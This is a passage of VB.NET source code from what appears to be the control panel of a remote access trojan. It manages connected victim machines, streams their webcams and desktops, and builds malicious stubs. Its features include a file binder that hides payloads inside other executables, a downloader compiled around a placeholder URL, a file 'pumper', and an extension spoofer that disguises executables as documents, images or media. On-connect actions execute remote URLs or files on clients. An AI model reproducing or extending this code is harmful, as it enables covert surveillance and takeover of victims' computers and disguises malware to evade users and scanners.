                Dim item As New BetterListViewItem(str.Split(New Char() {"|"c})(1), 0)
                item.SubItems.Add(str.Split(New Char() {"|"c})(2))
                item.Group = (DirectCast(Me.CheckGroup(str.Split(New Char() {"|"c})(0)), BetterListViewGroup))
                My.Forms.SysManager.LV_Startup.Items.Add(item)
                i += 1
            Loop
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddStatus(ByVal message As String, ByVal ParamArray args As Object())
        Me.StatusBarMain.Text = String.Format(message, args)
        Me.LV_Logs.Items.Add(Me.GetTime).SubItems.Add(String.Format(message, args))
    End Sub

    Private Sub AddSysManagerInfo(ByVal a1 As String, ByVal a2 As String, ByVal a3 As String, ByVal a4 As String, ByVal a5 As String, ByVal a6 As String, ByVal a7 As String, ByVal a8 As String, ByVal a9 As String, ByVal a10 As String, ByVal a11 As String, ByVal a12 As String, ByVal a13 As String, ByVal a14 As String, ByVal a15 As String, ByVal a16 As String, ByVal a17 As String, ByVal a18 As String, ByVal a19 As String, ByVal a20 As String, ByVal a21 As String, ByVal a22 As String, ByVal client As ServerClient)
        Try
            My.Forms.SysManager.TV_Information.Nodes.Item(0).Nodes.Item(0).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(0).Nodes.Item(0).Text & a1)
            My.Forms.SysManager.TV_Information.Nodes.Item(0).Nodes.Item(1).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(0).Nodes.Item(1).Text & a2)
            My.Forms.SysManager.TV_Information.Nodes.Item(1).Nodes.Item(0).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(1).Nodes.Item(0).Text & a3)
            My.Forms.SysManager.TV_Information.Nodes.Item(1).Nodes.Item(1).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(1).Nodes.Item(1).Text & client.EndPoint.Address.ToString)
            My.Forms.SysManager.TV_Information.Nodes.Item(1).Nodes.Item(2).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(1).Nodes.Item(2).Text & a4)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(0).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(0).Text & a5)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(1).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(1).Text & a6)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(2).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(2).Text & a7)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(3).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(3).Text & a8)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(4).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(4).Text & a9)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(5).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(5).Text & a10)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(6).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(6).Text & a11)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(7).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(7).Text & a12)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(8).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(8).Text & a13)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(9).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(9).Text & a14)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(10).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(10).Text & a15)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(11).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(11).Text & a16)
            My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(12).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(2).Nodes.Item(12).Text & a17)
            My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(0).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(0).Text & a18)
            My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(1).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(3).Text & a19)
            My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(2).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(2).Text & a20)
            My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(3).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(3).Text & a21)
            My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(4).Text = (My.Forms.SysManager.TV_Information.Nodes.Item(3).Nodes.Item(4).Text & a22)
            My.Forms.SysManager.TV_Information.ExpandAll()
            GC.Collect()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddThumbNailDesktop(ByVal client As ServerClient, ByVal img As Byte())
        Try
            Dim path As String = String.Format("{0}\{1}D.jpg", My.Computer.FileSystem.SpecialDirectories.Temp, client.EndPoint.Address.ToString)
            File.WriteAllBytes(path, img)
            Dim item As New ImageListViewItem(path)
            item.Text = (client.EndPoint.Address.ToString)
            Me.ImageListView1.Items.Add(item)
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddThumbNailWebCam(ByVal client As ServerClient, ByVal img As Byte())
        Try
            Dim path As String = String.Format("{0}\{1}W.jpg", My.Computer.FileSystem.SpecialDirectories.Temp, client.EndPoint.Address.ToString)
            File.WriteAllBytes(path, img)
            Dim item As New ImageListViewItem(path)
            item.Text = (client.EndPoint.Address.ToString)
            Me.ImageListView1.Items.Add(item)
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddWebcam(ByVal img As Byte())
        Try
            Me.swwebcam.Start()
            Me.Invoke(New DelegateAddWebcam(AddressOf Me.AddWebcamImage), New Object() {img})
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddWebcamDevices(ByVal txt As String)
        Dim num2 As Integer = (Me.CountCharacter(txt, "|"c) - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            My.Forms.RemoteWebcam.ComboBox1.Items.Add(txt.Split(New Char() {"|"c})(i))
            i += 1
        Loop
        My.Forms.RemoteWebcam.ComboBox1.SelectedIndex = 0
    End Sub

    Private Sub AddWebcamImage(ByVal img As Byte())
        Try
            Me.webcamcount = (Me.webcamcount + 1)
            Dim stream As New MemoryStream(img)
            My.Forms.RemoteWebcam.PictureBox1.Image = Image.FromStream(stream)
            My.Forms.RemoteWebcam.LabelFPS.Text = ("FPS: " & Conversions.ToString(CInt(Math.Round(CDbl((CDbl(Me.webcamcount) / Me.swwebcam.Elapsed.TotalSeconds))))))
            GC.Collect()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddWindows(ByVal txt As String)
        Me.Invoke(New Delegate_AddWindows(AddressOf Me._AddWindows), New Object() {txt})
    End Sub

    Private Sub AdminToolsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AdminToolsToolStripMenuItem.Click
        Try
            If (Me.LV_Clients.SelectedItems.Item(0).SubItems.Item(9).Text <> "Admin") Then
                MessageBox.Show("You can only perform adminstrative actions if the client has administrative privilegs!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Else
                My.Forms.RemoteAdminTools.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
                My.Forms.RemoteAdminTools.Text = ("Administrative Tools - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
                My.Forms.RemoteAdminTools.Show()
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AntiVirusToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AntiVirusToolStripMenuItem.Click
        Try
            Me.LV_Clients.Groups.Clear()
            If Not Me.called(3) Then
                Dim list As New ArrayList
                Dim item As BetterListViewItem
                For Each item In Me.LV_Clients.Items
                    If Not list.Contains(item.SubItems.Item(8).Text) Then
                        list.Add(item.SubItems.Item(8).Text)
                    End If
                Next
                Dim num As Integer = (list.Count - 1)
                Dim groupArray As BetterListViewGroup() = New BetterListViewGroup((num + 1) - 1) {}
                Dim num4 As Integer = num
                Dim i As Integer = 0
                Do While (i <= num4)
                    groupArray(i) = New BetterListViewGroup(Conversions.ToString(list.Item(i)))
                    groupArray(i).Font = (New Font("Verdana", 10.0!))
                    i += 1
                Loop
                Dim item2 As BetterListViewItem
                For Each item2 In Me.LV_Clients.Items
                    Dim num5 As Integer = num
                    Dim j As Integer = 0
                    Do While (j <= num5)
                        If (groupArray(j).Header = item2.SubItems.Item(8).Text) Then
                            item2.Group = (groupArray(j))
                            Me.LV_Clients.Groups.Add(groupArray(j))
                            Me.LV_Clients.Items.Add(item2)
                        End If
                        j += 1
                    Loop
                Next
                Me.LV_Clients.ShowGroups = (True)
                Me.called(3) = True
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub btn_scan_Click(sender As Object, e As EventArgs) Handles btn_scan.Click
        Try
            Me.LV_Scanner.Items.Clear()
            Using dialog As OpenFileDialog = New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.Multiselect = False
                dialog2.Title = "Select a file to scan!"
                If (dialog2.ShowDialog = DialogResult.OK) Then
                    Dim Thread_Scanning As New Thread(New ParameterizedThreadStart(AddressOf Me.lam__11))
                    Thread_Scanning.Start(dialog.FileName)
                    Me.ProgressBar1.Style = ProgressBarStyle.Marquee
                    Me.ProgressBar1.MarqueeAnimationSpeed = &H19
                End If
                dialog2 = Nothing
            End Using
        Catch ex As Exception

        End Try

    End Sub

    Private Sub btn_startlistening_Click(sender As Object, e As EventArgs) Handles btn_startlistening.Click
        Try
            Me.btn_stoplistening.Enabled = True
            Me.btn_startlistening.Enabled = False
            Me.listener.Listen(Conversions.ToUShort(Me.LV_Ports.Items.Item(0).Text))
            Me.LV_Ports.Items.Item(0).SubItems.Item(1).Text = ("Listening!")
            GC.Collect()
        Catch ex As Exception

        End Try

    End Sub

    Private Sub btn_stoplistening_Click(sender As Object, e As EventArgs) Handles btn_stoplistening.Click
        Try
            Me.btn_startlistening.Enabled = True
            Me.btn_stoplistening.Enabled = False
            Me.LV_Ports.LabelEdit = (True)
            Me.listener.Disconnect()
            '  LV_Clients.Items.Clear()
            Me.LV_Ports.Items.Item(0).SubItems.Item(1).Text = ("Idle")
            GC.Collect()
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If Not Me.CheckBox8.Checked Then
                Me.rtb_output.AppendText("You need to agree to the T.O.S to build a stub!")
            Else
                Dim dialog2 As New SaveFileDialog
                dialog2.Filter = "Executables | *.exe"
                dialog2.InitialDirectory = Application.StartupPath
                dialog2.Title = "Select where to save the stub..."
                If (dialog2.ShowDialog = DialogResult.OK) Then
                    Me.TR_Compile = New Thread(New ParameterizedThreadStart(AddressOf Me.lam__10))
                    Me.TR_Compile.Start(dialog2.FileName)
                End If
                dialog2 = Nothing
            End If
        Catch ex As Exception
            Me.StatusBarMain.Text = ex.Message

        End Try
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        Try
            Dim dialog2 As New SaveFileDialog
            dialog2.Title = "Save binded file to ..."
            dialog2.Filter = "Executables | *.exe"
            If (dialog2.ShowDialog = DialogResult.OK) Then
                Dim right As String = "[SPLITTER]"
                Dim data As Byte() = My.Resources.data
                My.Computer.FileSystem.WriteAllBytes(dialog2.FileName, data, False)
                Dim inArray As Byte() = My.Computer.FileSystem.ReadAllBytes(Me.TextBox7.Text)
                Dim buffer3 As Byte() = My.Computer.FileSystem.ReadAllBytes(Me.TextBox8.Text)
                File.AppendAllText(dialog2.FileName, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((right & Convert.ToBase64String(inArray) & right), Me.TextBox7.Tag), right), Convert.ToBase64String(buffer3)), right), Me.TextBox8.Tag)))
                MessageBox.Show("Successfully binded!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            End If
            dialog2 = Nothing
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Using dialog As OpenFileDialog = New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.Multiselect = False
                dialog2.Title = "Select a File to pump..."
                If (dialog2.ShowDialog = DialogResult.OK) Then
                    Me.TextBox4.Text = dialog.FileName
                    Me.Label21.Text = Conversions.ToString(Operators.ConcatenateObject("Current Filesize: ", My.Forms.FileManager.FormatSize(New FileInfo(dialog.FileName).Length)))
                End If
                dialog2 = Nothing
            End Using
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Dim num As Double = Conversion.Val(Me.NumericUpDown10.Value)
            If Me.RadioButton4.Checked Then
                num = (num * 1024)
            ElseIf Me.RadioButton5.Checked Then
                num = (num * 1048576)
            ElseIf Me.RadioButton6.Checked Then
                num = (num * 1097485676)
            Else
                Return
            End If
            Dim stream As FileStream = File.OpenWrite(Me.TextBox4.Text)
            Dim i As Long = stream.Seek(0, SeekOrigin.End)
            Do While (i < num)
                stream.WriteByte(0)
                i = (i + 1)
            Loop
            stream.Close()
            MessageBox.Show("File was successfully pumped!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            Dim dialog As New SaveFileDialog
            Dim dialog2 As SaveFileDialog = dialog
            dialog2.Filter = "Executables | *.exe"
            dialog2.InitialDirectory = FileSystem.CurDir
            dialog2.Title = "Select a path where to save the downloader..."""
            If (dialog2.ShowDialog = DialogResult.OK) Then
                Dim source As String = My.Settings.downloader.Replace("REPLACEURLHERE", Me.TextBox5.Text)
                Dim compiler As ICodeCompiler = New VBCodeProvider().CreateCompiler
                Dim options As New CompilerParameters
                options.ReferencedAssemblies.Add("System.dll")
                options.ReferencedAssemblies.Add("System.Windows.Forms.dll")
                options.GenerateExecutable = True
                options.OutputAssembly = dialog.FileName
                options.CompilerOptions = "/target:winexe /platform:x86 /optimize+ /filealign:512"
                If (Not Me.PictureBox2.Tag Is Nothing) Then
                    Dim parameters2 As CompilerParameters = options
                    parameters2.CompilerOptions = Conversions.ToString(Operators.AddObject(parameters2.CompilerOptions, Operators.ConcatenateObject(" /win32icon:", Me.PictureBox2.Tag)))
                End If
                Dim results As CompilerResults = compiler.CompileAssemblyFromSource(options, source)
            End If
            dialog2 = Nothing
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Try
            Using dialog As OpenFileDialog = New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.Multiselect = False
                dialog2.Filter = "Icons | *.ico"
                dialog2.Title = "Select an icon..."
                If (dialog2.ShowDialog = DialogResult.OK) Then
                    Me.PictureBox2.Image = Image.FromFile(dialog.FileName)
                    Me.PictureBox2.Tag = dialog.FileName
                End If
                dialog2 = Nothing
            End Using
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Using dialog As OpenFileDialog = New OpenFileDialog
            Dim dialog2 As OpenFileDialog = dialog
            dialog2.Filter = "Executables | *.exe"
            dialog2.InitialDirectory = Application.StartupPath
            dialog2.Multiselect = False
            dialog2.Title = "Select a file to spoof!"
            If (dialog2.ShowDialog = DialogResult.OK) Then
                Me.TextBox6.Text = dialog2.FileName
            End If
            dialog2 = Nothing
        End Using
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Try
            If (((Me.TextBox6.Text <> "") AndAlso (Not Me.TextBox6.Text Is Nothing)) AndAlso (Me.ComboBox4.SelectedIndex <> -1)) Then
                Dim str As String
                Dim str2 As String
                If (Me.ComboBox4.SelectedIndex = 0) Then
                    str2 = (Application.StartupPath & "\Icons\7z.ico")
                    str = ".7z"
                ElseIf (Me.ComboBox4.SelectedIndex = 1) Then
                    str2 = (Application.StartupPath & "\Icons\aac.ico")
                    str = ".aac"
                ElseIf (Me.ComboBox4.SelectedIndex = 2) Then
                    str2 = (Application.StartupPath & "\Icons\bat.ico")
                    str = ".bat"
                ElseIf (Me.ComboBox4.SelectedIndex = 3) Then
                    str2 = (Application.StartupPath & "\Icons\bmp.ico")
                    str = ".bmp"
                ElseIf (Me.ComboBox4.SelectedIndex = 4) Then
                    str2 = (Application.StartupPath & "\Icons\data.ico")
                    str = ".data"
                ElseIf (Me.ComboBox4.SelectedIndex = 5) Then
                    str2 = (Application.StartupPath & "\Icons\docx.ico")
                    str = ".docx"
                ElseIf (Me.ComboBox4.SelectedIndex = 6) Then
                    str2 = (Application.StartupPath & "\Icons\html.ico")
                    str = ".html"
                ElseIf (Me.ComboBox4.SelectedIndex = 7) Then
                    str2 = (Application.StartupPath & "\Icons\ini.ico")
                    str = ".ini"
                ElseIf (Me.ComboBox4.SelectedIndex = 8) Then
                    str2 = (Application.StartupPath & "\Icons\iso.ico")
                    str = ".iso"
                ElseIf (Me.ComboBox4.SelectedIndex = 9) Then
                    str2 = (Application.StartupPath & "\Icons\jpeg.ico")
                    str = ".jpeg"
                ElseIf (Me.ComboBox4.SelectedIndex = 10) Then
                    str2 = (Application.StartupPath & "\Icons\jpg.ico")
                    str = ".jpg"
                ElseIf (Me.ComboBox4.SelectedIndex = 11) Then
                    str2 = (Application.StartupPath & "\Icons\jar.ico")
                    str = ".jar"
                ElseIf (Me.ComboBox4.SelectedIndex = 12) Then
                    str2 = (Application.StartupPath & "\Icons\m4a.ico")
                    str = ".m4a"
                ElseIf (Me.ComboBox4.SelectedIndex = 13) Then
                    str2 = (Application.StartupPath & "\Icons\m4v.ico")
                    str = ".m4v"
                ElseIf (Me.ComboBox4.SelectedIndex = 14) Then
                    str2 = (Application.StartupPath & "\Icons\mp3.ico")
                    str = ".mp3"
                ElseIf (Me.ComboBox4.SelectedIndex = 15) Then
                    str2 = (Application.StartupPath & "\Icons\mp4v.ico")
                    str = ".mp4v"
                ElseIf (Me.ComboBox4.SelectedIndex = &H10) Then
                    str2 = (Application.StartupPath & "\Icons\mpeg.ico")
                    str = ".mpeg"
                ElseIf (Me.ComboBox4.SelectedIndex = &H11) Then
                    str2 = (Application.StartupPath & "\Icons\pdf.ico")
                    str = ".pdf"
                ElseIf (Me.ComboBox4.SelectedIndex = &H12) Then
                    str2 = (Application.StartupPath & "\Icons\ppt.ico")
                    str = ".ppt"
                ElseIf (Me.ComboBox4.SelectedIndex = &H13) Then
                    str2 = (Application.StartupPath & "\Icons\pptx.ico")
                    str = ".pptx"
                ElseIf (Me.ComboBox4.SelectedIndex = 20) Then
                    str2 = (Application.StartupPath & "\Icons\py.ico")
                    str = ".py"
                ElseIf (Me.ComboBox4.SelectedIndex = 21) Then
                    str2 = (Application.StartupPath & "\Icons\rar.ico")
                    str = ".rar"
                ElseIf (Me.ComboBox4.SelectedIndex = &H16) Then
                    str2 = (Application.StartupPath & "\Icons\swf.ico")
                    str = ".swf"
                ElseIf (Me.ComboBox4.SelectedIndex = 23) Then
                    str2 = (Application.StartupPath & "\Icons\torrent.ico")
                    str = ".torrent"
                ElseIf (Me.ComboBox4.SelectedIndex = &H18) Then
                    str2 = (Application.StartupPath & "\Icons\ttf.ico")
                    str = ".ttf"
                ElseIf (Me.ComboBox4.SelectedIndex = &H19) Then
                    str2 = (Application.StartupPath & "\Icons\txt.ico")
                    str = ".txt"
                ElseIf (Me.ComboBox4.SelectedIndex = 26) Then
                    str2 = (Application.StartupPath & "\Icons\vbs.ico")
                    str = ".vbs"
                ElseIf (Me.ComboBox4.SelectedIndex = 27) Then
                    str2 = (Application.StartupPath & "\Icons\wav.ico")
                    str = ".wav"
                ElseIf (Me.ComboBox4.SelectedIndex = 28) Then
                    str2 = (Application.StartupPath & "\Icons\wma.ico")
                    str = ".wma"
                ElseIf (Me.ComboBox4.SelectedIndex = &H1D) Then
                    str2 = (Application.StartupPath & "\Icons\wmv.ico")
                    str = ".wmv"
                End If
                Dim file As New IconFile(str2)
                file.ConvertToGroupIconResource.SaveTo(Me.TextBox6.Text)
                Dim str3 As String = (Application.ExecutablePath & "\Icons") & (Me.TextBox6.Text).Replace(".exe", str)
                My.Computer.FileSystem.RenameFile(Me.TextBox6.Text, (str3 & ".exe"))
                MessageBox.Show("Extension was spoofed successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            MessageBox.Show(exception.Message, "Exception", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Dim dialog2 As New OpenFileDialog
        dialog2.Title = "Select a File..."
        dialog2.Filter = "All Files | *.*"
        If (dialog2.ShowDialog = DialogResult.OK) Then
            Me.TextBox7.Tag = dialog2.SafeFileName
            Me.TextBox7.Text = dialog2.FileName
        End If
        dialog2 = Nothing
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        Dim dialog2 As New OpenFileDialog
        dialog2.Title = "Select a File to bind..."
        dialog2.Filter = "All Files | *.*"
        If (dialog2.ShowDialog = DialogResult.OK) Then
            Me.TextBox8.Tag = dialog2.SafeFileName
            Me.TextBox8.Text = dialog2.FileName
        End If
        dialog2 = Nothing
    End Sub
    Private Sub CatchUnhandledException(ByVal sender As Object, ByVal e As UnhandledExceptionEventArgs)
    End Sub

    Private Sub cb_autolisten_CheckedChanged(sender As Object, e As EventArgs) Handles cb_autolisten.CheckedChanged
        My.Settings.autolistening = Me.cb_autolisten.Checked
        My.Settings.Save()
    End Sub

    Private Sub cb_notify_CheckedChanged(sender As Object, e As EventArgs) Handles cb_notify.CheckedChanged
        My.Settings.notify = Me.cb_notify.Checked
        My.Settings.Save()
    End Sub

    Private Sub cb_sound_CheckedChanged(sender As Object, e As EventArgs) Handles cb_sound.CheckedChanged
        My.Settings.sounds = Me.cb_sound.Checked
        My.Settings.Save()
    End Sub
    Private Sub ChangeColor(ByVal l As BetterListViewItem, ByVal color As Color)
        l.ForeColor = (color)
        l.SubItems.Item(1).ForeColor = (color)
    End Sub

    Private Sub ChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChatToolStripMenuItem.Click
        Try
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.LV_Clients.SelectedItems.Item(0).Tag)
            Dim item As BetterListViewItem
            For Each item In Me.LV_Clients.SelectedItems
                My.Forms.RemoteChat.clients.Add(RuntimeHelpers.GetObjectValue(item.Tag))
                My.Forms.RemoteChat.TV_ConnectedClients.Nodes.Add(NewLateBinding.LateGet(NewLateBinding.LateGet(item.Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            Next
            My.Forms.RemoteChat.Show()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If Me.CheckBox1.Checked Then

            Me.RadioButton1.Enabled = True
            Me.RadioButton2.Enabled = True
            Me.RadioButton3.Enabled = True
        Else

            Me.RadioButton1.Enabled = False
            Me.RadioButton2.Enabled = False
            Me.RadioButton3.Enabled = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If Me.CheckBox2.Checked Then
            Me.CheckBox6.Enabled = True
            Me.TextBox3.Enabled = True
        Else
            Me.CheckBox6.Enabled = False
            Me.TextBox3.Enabled = False
        End If
    End Sub

    Private Sub CheckBox7_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox7.CheckedChanged
        If Me.CheckBox7.Checked Then
            Me.NumericUpDown1.Enabled = True
        Else
            Me.NumericUpDown1.Enabled = False
        End If
    End Sub
    Public Function CheckGroup(ByVal txt As String) As Object
        If (txt = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run") Then
            Return Me.Groups(0)
        End If
        If (txt = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce") Then
            Return Me.Groups(1)
        End If
        If (txt = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run") Then
            Return Me.Groups(2)
        End If
        If (txt = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce") Then
            Return Me.Groups(3)
        End If
        If (txt = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp") Then
            Return Me.Groups(4)
        End If
        If Not Me.alreadygroup Then
            Me.Groups(5) = New BetterListViewGroup(txt)
            My.Forms.SysManager.LV_Startup.Groups.Add(Me.Groups(5))
            Me.alreadygroup = True
        End If
        Return Me.Groups(5)
    End Function

    Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        Me.LV_Logs.Items.Clear()
        Me.StatusBarMain.Text = ""
    End Sub

    Private Sub ClientIDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientIDToolStripMenuItem.Click
        Try
            Me.LV_Clients.Groups.Clear()
            If Not Me.called(1) Then
                Dim list As New ArrayList
                Dim item As BetterListViewItem
                For Each item In Me.LV_Clients.Items
                    If Not list.Contains(item.SubItems.Item(3).Text) Then
                        list.Add(item.SubItems.Item(3).Text)
                    End If
                Next
                Dim num As Integer = (list.Count - 1)
                Dim groupArray As BetterListViewGroup() = New BetterListViewGroup((num + 1) - 1) {}
                Dim num4 As Integer = num
                Dim i As Integer = 0
                Do While (i <= num4)
                    groupArray(i) = New BetterListViewGroup(Conversions.ToString(list.Item(i)))
                    groupArray(i).Font = (New Font("Verdana", 10.0!))
                    i += 1
                Loop
                Dim item2 As BetterListViewItem
                For Each item2 In Me.LV_Clients.Items
                    Dim num5 As Integer = num
                    Dim j As Integer = 0
                    Do While (j <= num5)
                        If (groupArray(j).Header = item2.SubItems.Item(3).Text) Then
                            item2.Group = (groupArray(j))
                            Me.LV_Clients.Groups.Add(groupArray(j))
                            Me.LV_Clients.Items.Add(item2)
                        End If
                        j += 1
                    Loop
                Next
                Me.LV_Clients.ShowGroups = (True)
                Me.called(1) = True
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ComboBox1_EnabledChanged(sender As Object, e As EventArgs) Handles ComboBox1.EnabledChanged
        If (Me.ComboBox1.SelectedIndex <> -1) Then
            Me.ComboBox2.Enabled = True
        Else
            Me.ComboBox2.Enabled = False
        End If
    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox2.SelectedIndexChanged
        If (Me.ComboBox2.SelectedIndex = 0) Then
            Select Case Me.ComboBox1.SelectedIndex
                Case 0
                    Me.execurl(Me.ComboBox2.SelectedItem.ToString)
                    Exit Select
                Case 1
                    Me.execfile(Me.ComboBox2.SelectedItem.ToString)
                    Exit Select
                Case 2
                    Me.updateurl(Me.ComboBox2.SelectedItem.ToString)
                    Exit Select
                Case 3
                    Me.updatefile(Me.ComboBox2.SelectedItem.ToString)
                    Exit Select
                Case 4
                    Me.InputBx(Me.ComboBox2.SelectedItem.ToString)
                    Exit Select
                Case 5
                    Me.msbox(Me.ComboBox2.SelectedItem.ToString)
                    Exit Select
                Case 6
                    Dim item As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 6)
                    item.SubItems.Add("Disconnect")
                    item.SubItems.Add(Me.ComboBox2.SelectedItem.ToString)
                    item = Nothing
                    Exit Select
                Case 7
                    Dim item2 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 7)
                    item2.SubItems.Add("Uninstall")
                    item2.SubItems.Add(Me.ComboBox2.SelectedItem.ToString)
                    item2 = Nothing
                    Exit Select
                Case 8
                    Dim item3 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 8)
                    item3.SubItems.Add("Restart")
                    item3.SubItems.Add(Me.ComboBox2.SelectedItem.ToString)
                    item3 = Nothing
                    Exit Select
            End Select
        ElseIf (Me.ComboBox2.SelectedIndex = 1) Then
            Me.ComboBox3.Enabled = True
            Me.ComboBox3.Items.Clear()
